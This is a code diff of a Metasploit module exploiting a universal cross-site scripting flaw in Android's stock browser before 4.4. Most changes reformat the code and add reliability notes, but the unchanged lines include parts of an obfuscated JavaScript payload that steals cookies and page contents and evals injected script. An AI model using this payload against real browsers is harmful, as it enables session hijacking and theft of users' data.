@@ -9,37 +9,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Android Open Source Platform (AOSP) Browser UXSS',
-      'Description'    => %q{
-        This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in
-        all versions of Android's open source stock browser before 4.4, and Android apps running
-        on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug
-        to scrape both cookie data and page contents from a vulnerable browser window.
+    super(
+      update_info(
+        info,
+        'Name' => 'Android Open Source Platform (AOSP) Browser UXSS',
+        'Description' => %q{
+          This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in
+          all versions of Android's open source stock browser before 4.4, and Android apps running
+          on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug
+          to scrape both cookie data and page contents from a vulnerable browser window.
 
-        Target URLs that use X-Frame-Options can not be exploited with this vulnerability.
+          Target URLs that use X-Frame-Options can not be exploited with this vulnerability.
 
-        Some sample UXSS scripts are provided in data/exploits/uxss.
-      },
-      'Author'         => [
-        'Rafay Baloch', # Original discovery, disclosure
-        'joev'          # Metasploit module
-      ],
-      'License'        => MSF_LICENSE,
-      'Actions'        => [
-        [ 'WebServer' ]
-      ],
-      'PassiveActions' => [
-        'WebServer'
-      ],
-      'References' => [
-        [ 'URL', 'http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html'],
-        [ 'URL', 'https://android.googlesource.com/platform/external/webkit/+/109d59bf6fe4abfd001fc60ddd403f1046b117ef' ],
-        [ 'URL', 'http://trac.webkit.org/changeset/96826/webkit' ]
-      ],
-      'DefaultAction'  => 'WebServer',
-      'DisclosureDate' => '2014-10-04'
-    ))
+          Some sample UXSS scripts are provided in data/exploits/uxss.
+        },
+        'Author' => [
+          'Rafay Baloch', # Original discovery, disclosure
+          'joev'          # Metasploit module
+        ],
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          [ 'WebServer' ]
+        ],
+        'PassiveActions' => [
+          'WebServer'
+        ],
+        'References' => [
+          [ 'URL', 'http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html'],
+          [ 'URL', 'https://android.googlesource.com/platform/external/webkit/+/109d59bf6fe4abfd001fc60ddd403f1046b117ef' ],
+          [ 'URL', 'http://trac.webkit.org/changeset/96826/webkit' ]
+        ],
+        'DefaultAction' => 'WebServer',
+        'DisclosureDate' => '2014-10-04',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       OptString.new('TARGET_URLS', [
@@ -67,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
       collect_data(request)
       send_response_html(cli, '')
     else
-      payload_fn = Rex::Text.rand_text_alphanumeric(4+rand(8))
+      payload_fn = Rex::Text.rand_text_alphanumeric(4 + rand(8))
       domains = datastore['TARGET_URLS'].split(',')
 
       script = js_obfuscate <<-EOS
@@ -81,7 +89,7 @@ class MetasploitModule < Msf::Auxiliary
               'JSON.stringify({cookie:document.cookie,url:location.href,body:document.body.innerH'+
               'TML,i:'+(i||0)+'}),"*");eval(atob("#{Rex::Text.encode_base64(custom_js)}"'+
               '));}void(0);';
-            obj.innerHTML = '#{Rex::Text.rand_text_alphanumeric(rand(12)+5)}';
+            obj.innerHTML = '#{Rex::Text.rand_text_alphanumeric(rand(12) + 5)}';
           };
           document.body.appendChild(obj);
         });
